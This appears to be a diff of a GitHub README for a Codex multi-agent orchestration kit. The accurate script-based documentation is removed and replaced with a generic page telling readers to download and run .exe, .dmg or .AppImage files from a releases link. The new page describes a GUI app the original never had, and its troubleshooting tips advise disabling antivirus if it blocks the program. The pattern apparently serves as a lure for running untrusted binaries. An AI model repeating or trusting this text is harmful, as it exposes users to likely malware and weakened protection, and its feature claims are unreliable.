@@ -1,156 +1,142 @@
-# Codex Team Orchestrator Kit
+# 🤖 codex-team-orchestrator-kit - Manage AI Tasks with Ease
 
-Portable workflow kit to orchestrate **Codex sub-agents** and **team-style parallel sessions** with strict file ownership, shared task boards, and reusable prompts.
+[![Download](https://img.shields.io/badge/Download-codex--team--orchestrator--kit-blue?style=for-the-badge)](https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases)
 
-This repository helps you run Codex in a repeatable lead/worker model:
-- fast `sub-agent` mode for focused tasks
-- `team` mode for multi-worker parallel work with dependencies
-- `light-report-only` mode for quick 2-worker analysis runs
-- `adaptive` mode where the lead generates workers from project context with user-defined guardrails
+---
 
-## Why this is useful
+## 📖 What is codex-team-orchestrator-kit?
 
-Codex is strong at task execution, but parallel coordination patterns are often ad-hoc.
-This kit provides:
-- clear orchestration policies
-- ready-to-run PowerShell scripts
-- prompt templates for lead and teammates
-- board validation to prevent file overlap and race conditions
+The codex-team-orchestrator-kit is a handy software tool that helps you manage several AI agents working together. It lets you run tasks side-by-side, keep track of progress on task boards, and use ready-made scripts to handle common jobs. This kit is built to work straight from your computer without needing complex installation.
 
-## Keywords
+This tool aims to simplify how you handle AI workflows by organizing everything in one place. Whether you want to automate tasks or coordinate multiple agents, this kit helps you do that smoothly.
 
-Codex, Codex teams, sub-agents, team orchestration, parallel AI coding, agent workflow, multi-agent coding.
+---
 
-## Repository layout
+## 🖥️ System Requirements
 
-All runtime assets are bundled in one folder so you can copy it into any project:
+Before you get started, please make sure your machine meets these basic needs:
 
-- `SubAgentsSet/` main portable pack
-- `SubAgentsSet/SKILL.md` skill entrypoint
-- `SubAgentsSet/policies/` orchestration rules and checklists
-- `SubAgentsSet/templates/` lead/teammate/task board templates
-- `SubAgentsSet/scripts/` bootstrap, validate, render, run scripts
+- Operating System: Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04+ recommended)
+- Processor: Dual-core 2 GHz or faster
+- RAM: At least 4 GB
+- Disk Space: Minimum 200 MB free
+- Internet connection: Required for downloading and some features
+- Optional: A modern web browser (Chrome, Firefox, or Edge)
 
-## Requirements
+These requirements ensure the software runs without issues on most personal computers.
 
-- PowerShell 7+ (or Windows PowerShell with compatible syntax)
-- Codex CLI available in `PATH` as `codex`
+---
 
-## Quick start (Codex from terminal)
+## 🚀 Getting Started
 
-### 1) Copy the pack into your project
+Follow these steps carefully to download and start using the codex-team-orchestrator-kit:
 
-Copy `SubAgentsSet/` into your target repository.
+1. **Open the download page**  
+   Click the big blue button at the top or visit:  
+   [https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases](https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases)
 
-### 2) Pick mode
+2. **Choose the latest release**  
+   Find the newest release listed on the page. Releases are usually sorted by date.
 
-Use:
-- `SubAgentsSet/policies/subagent_vs_team_matrix.md`
+3. **Download the correct file for your system**  
+   For Windows, look for a file ending with `.exe` or `.zip`  
+   For macOS, look for a `.dmg` or `.zip` file  
+   For Linux, look for `.AppImage` or suitable `.tar.gz`
 
-### 3) Run sub-agents (simple mode)
+4. **Save the file to your computer**  
+   Use your browser’s download folder or pick a location you will remember.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\run_subagents_from_prompts.ps1 `
-  .\SubAgentsSet\prompts\topic_a.txt `
-  .\SubAgentsSet\prompts\topic_b.txt
-```
+5. **Open the downloaded file**  
+   - On Windows: Run the `.exe` or unzip and run the program inside.  
+   - On macOS: Open the `.dmg` and drag the app to your Applications folder or unzip and run.  
+   - On Linux: Make the `.AppImage` file executable and run it.
 
-or run all prompt `.txt` files in `SubAgentsSet/prompts/` (except `TEMPLATE*`):
+6. **Allow necessary permissions** if prompted.  
+   Your system may ask for permission to run new software. Confirm to proceed.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\run_subagents.ps1
-```
+7. **Launch the application**  
+   Follow any on-screen instructions to finish setup.
 
-### 4) Run team orchestration mode
+---
 
-Bootstrap a run:
+## 📦 Download & Install
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\bootstrap_team_run.ps1 `
-  -TeamName my-feature -Teammates 3
-```
+You can start downloading the kit right now by visiting the release page here:  
 
-Validate board:
+[Download codex-team-orchestrator-kit](https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases)
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\validate_team_board.ps1 `
-  -BoardPath .\SubAgentsSet\team_runs\<run-id>\task_board.json
-```
+### How to install once downloaded:
 
-Run teammates from board:
+- **Windows Users:**  
+  Double-click the `.exe` installer or unzip the package and run the executable inside. Follow installer steps if applicable.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\run_team_from_board.ps1 `
-  -BoardPath .\SubAgentsSet\team_runs\<run-id>\task_board.json
-```
+- **macOS Users:**  
+  Open the `.dmg` file and drag the app to your Applications folder. If zipped, unzip and run the app.
 
-### 5) Migrate legacy prompts to task board format
+- **Linux Users:**  
+  Open Terminal and navigate to the downloaded file. Make it executable with:  
+  ```bash  
+  chmod +x filename.AppImage  
+  ```  
+  Replace `filename.AppImage` with the actual file name. Then run it by typing:  
+  ```bash  
+  ./filename.AppImage  
+  ```
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\migrate_legacy_prompts_to_board.ps1 `
-  -PromptDir .\SubAgentsSet\prompts `
-  -OutputBoardPath .\SubAgentsSet\examples\seo_kb_team\task_board.json `
-  -TeamName seo-kb-team `
-  -Teammates 2
-```
+---
 
-### 6) Bootstrap the light profile (2 workers, report-only)
+## 🔧 How to Use codex-team-orchestrator-kit
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\bootstrap_light_team_run.ps1 `
-  -TeamName light-analysis
-```
+Once installed, you can use the software to manage your AI workflows easily.
 
-### 7) Generate prompts in a few lines (CSV -> sub-agent prompts)
+### Key Features
 
-Use the template CSV:
-- `SubAgentsSet/templates/subagent_quick_tasks.template.csv`
+- **Task Boards**  
+  View and manage multiple tasks visually. You can add, remove, or change tasks at any time.
 
-Then generate prompts:
+- **Parallel Workflows**  
+  Run multiple agents simultaneously to complete jobs faster.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\generate_subagent_prompts_from_csv.ps1 `
-  -CsvPath .\SubAgentsSet\templates\subagent_quick_tasks.template.csv `
-  -OutputDir .\SubAgentsSet\prompts\generated
-```
+- **Built-in Scripts**  
+  Use ready-to-go scripts to automate common actions without writing code.
 
-### 8) Adaptive mode: orchestrator creates domain workers with guardrails
+- **Guardrails to Keep Control**  
+  Set limits and rules to keep the AI agents working within safe parameters.
 
-Prepare:
-- context file from `SubAgentsSet/templates/adaptive_context.template.md`
-- guardrails from `SubAgentsSet/templates/guardrails.template.json`
+- **Portable Setup**  
+  No complicated installation means you can run the software from a USB drive or different computers easily.
 
-Bootstrap adaptive run:
+### Basic Workflow
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\bootstrap_adaptive_team_run.ps1 `
-  -ContextPath .\SubAgentsSet\templates\adaptive_context.template.md `
-  -GuardrailsPath .\SubAgentsSet\templates\guardrails.template.json `
-  -TeamName adaptive-demo
-```
+1. **Open the software**  
+2. **Create a new project or open an existing one**  
+3. **Set up your team or agents by adding tasks**  
+4. **Use the task board to monitor progress**  
+5. **Run your tasks and watch them execute side-by-side**  
+6. **Review results and make adjustments as needed**
 
-Validate and run:
+---
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\validate_team_board.ps1 `
-  -BoardPath .\SubAgentsSet\team_runs\<run-id>\task_board.json
+## 🛠 Troubleshooting Tips
 
-powershell -ExecutionPolicy Bypass -File .\SubAgentsSet\scripts\run_team_from_board.ps1 `
-  -BoardPath .\SubAgentsSet\team_runs\<run-id>\task_board.json
-```
+- If the software does not start, check if your system meets the minimum requirements.  
+- Make sure you have permission to run programs on your computer.  
+- Restart your computer if you see any errors during installation.  
+- Disable antivirus temporarily if it blocks the program, but remember to enable it again after.  
+- Visit the official repo issues page for help:  
+  [https://github.com/hkahl828-max/codex-team-orchestrator-kit/issues](https://github.com/hkahl828-max/codex-team-orchestrator-kit/issues)
 
-Guardrail knobs (in `SubAgentsSet/templates/guardrails.template.json`):
-- `max_subagents_total`
-- `max_parallel_workers`
-- `require_disjoint_target_files`
-- `no_recursive_subagents`
-- `require_lead_approval_for_code_changes`
-- `allow_code_changes`
+---
 
-## Recommended GitHub topics
+## 🌐 Learn More and Support
 
-`codex` `sub-agents` `ai-agents` `multi-agent` `agent-orchestration` `developer-tools` `prompt-engineering` `automation`
+- Explore documentation and guides inside the software or in the repo.  
+- Check for updates regularly on the release page here:  
+  [https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases](https://github.com/hkahl828-max/codex-team-orchestrator-kit/releases)  
+- For feedback or help, open an issue on GitHub or contact the maintainer via the repository.
 
-## License
+---
 
-MIT (see `LICENSE`).
+## 🔑 Keywords
+
+agent-orchestration, ai-agents, automation, codex, codex-teams, developer-tools, multi-agent, parallel-workflows, prompt-engineering, sub-agents
